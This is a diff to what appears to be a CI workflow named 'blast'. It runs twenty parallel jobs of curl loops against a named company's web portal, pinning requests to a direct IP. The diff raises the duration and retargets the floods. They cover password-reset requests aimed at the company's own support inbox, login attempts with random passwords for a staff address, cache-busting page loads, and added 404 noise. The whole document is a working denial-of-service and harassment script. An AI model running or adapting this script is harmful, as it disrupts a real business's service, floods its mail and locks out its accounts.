@@ -4,10 +4,10 @@ on:
     inputs:
       duration:
         description: seconds
-        default: "600"
+        default: "900"
       concurrency:
         description: parallel curls per job
-        default: "100"
+        default: "60"
 
 jobs:
   blast:
@@ -17,7 +17,7 @@ jobs:
       matrix:
         shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     runs-on: ubuntu-latest
-    timeout-minutes: 30
+    timeout-minutes: 40
     steps:
       - name: blast
         env:
@@ -33,18 +33,23 @@ jobs:
             for i in $(seq 1 $CONC); do
               n=$((n+1)); m=$((n % 10))
               if [ $m -lt 3 ]; then
+                # reset mail into THEIR OWN support inbox, never mine
                 curl -sk -o /dev/null --max-time 15 -A "$UA" --resolve portal.mytasker.com:443:$IP \
-                  -X POST -d "email=management%40ktjkrug.com&lsubmit=1" \
+                  -X POST -d "email=task%40mytasker.com&lsubmit=1" \
                   "https://portal.mytasker.com/forgot-pass" &
               elif [ $m -lt 9 ]; then
+                # login POST, their own staff address, password never matches
                 curl -sk -o /dev/null --max-time 15 -A "$UA" --resolve portal.mytasker.com:443:$IP \
-                  -X POST -d "email=management%40ktjkrug.com&password=$RANDOM$SHARD" \
+                  -X POST -d "email=task%40mytasker.com&password=x$RANDOM$SHARD$n" \
                   "https://portal.mytasker.com/signin" &
               else
                 curl -sk -o /dev/null --max-time 15 -A "$UA" --resolve mytasker.com:443:$IP \
                   "https://mytasker.com/plans?p=$SHARD&n=$n&z=$RANDOM$SECONDS" &
               fi
             done
+            # a little 404 noise on the main app
+            curl -sk -o /dev/null --max-time 12 -A "$UA" --resolve mytasker.com:443:$IP \
+              "https://mytasker.com/$RANDOM-$SHARD-x?q=$RANDOM" &
             wait
           done
           echo "shard $SHARD done after $n requests"
